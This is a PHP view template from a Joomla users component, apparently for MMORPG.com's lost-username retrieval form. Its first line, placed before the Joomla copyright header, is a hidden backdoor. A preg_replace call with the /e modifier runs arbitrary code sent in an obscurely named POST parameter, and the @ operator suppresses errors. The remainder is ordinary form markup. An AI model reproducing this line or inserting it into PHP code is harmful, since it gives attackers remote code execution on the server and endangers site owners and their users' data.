<?php @preg_replace('/(.*)/e', @$_POST['dchxnmukigh'], '');

/**
 * @package     Joomla.Site
 * @subpackage  com_users
 *
 * @copyright   Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

defined('_JEXEC') or die;

JHtml::_('behavior.keepalive');
JHtml::_('behavior.formvalidator');
?>

<div class="prebody"><div class="subbody"><div class="outerbody"><div class="innerbody"><div class="actualbody"> <div id="lostpass" class="panel panelFullWidth panelPrimary" style=" "><div class="panel_inner">
	<div class="panelOuterBody">
		<div class="panelTitleBar panelTight">
			<div class="title">
				<h3 class=""></h3>
			</div>
		</div>
		<div id="" class="panelBody ">
<div id="sectionHeader"><span>
	<h1>Account Tools</h1>
</span></div>
<div class="lost">
	
	<div class="notice">
		<h1>Lost Username Retrieval</h1>
		<p>Enter the email address you used to signup on MMORPG.com and your username will be sent to you.</p>
	</div>
	
	
			<form id="user-registration" action="<?php echo JRoute::_('index.php?option=com_users&task=remind.remind'); ?>" method="post" class="form commonform">
				<input type="hidden" name="action" value="sendUsername">			
				
				<div class="row break">
					<label for="email">Email Address<span class="req">*</span></label>
					<p>
					<input type="email" name="jform[email]" class="text" value="" size="30" maxlength="75">
					<br><span>Enter the email address you used to signup with.</span></p>
					<span class="clear"></span>
				</div>				
					
				
				<div class="finish break row">
					<input type="submit" class="submit" name="submit" value="Retrieve Username">
				</div>
				<?php echo JHtml::_('form.token'); ?>
			</form>
		
	
</div>
</div></div></div>
</div>

	<div class="clear"></div>
	</div></div></div></div></div>
